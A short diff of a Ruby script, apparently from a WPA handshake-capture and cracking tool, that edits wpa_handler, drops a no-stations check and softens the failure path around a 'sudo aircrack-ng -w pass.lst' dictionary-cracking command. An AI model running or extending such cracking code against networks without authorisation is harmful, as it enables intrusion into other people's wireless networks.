@@ -3,12 +3,7 @@ require './monitoring_stopper.rb'
 require './cleaner.rb'
 # Hanshake capture
 
-def wpa_handler router = Router.new
-	
-	if r.stations[0].nil?
-		system("clear")
-		abort("Error: No stations found\nNote: In order for this attack to work someone has to be using the router.\n")
-	end
+def wpa_handler r = Router.new
 	
 	# Begin Loop
 	begin
@@ -29,10 +24,11 @@ def wpa_handler router = Router.new
 
 		if !system("sudo aircrack-ng -w pass.lst replay-01.ivs > crack_info.txt")
 			system("clear")
-			abort("\nCracker fail!")
+			puts "\nCracking failed! Try again!"
+		else
+			puts "Done cracking!" 
 		end
 		
-		puts "Done cracking!" 
 		puts
 		key = "ERROR!"
 		found = false
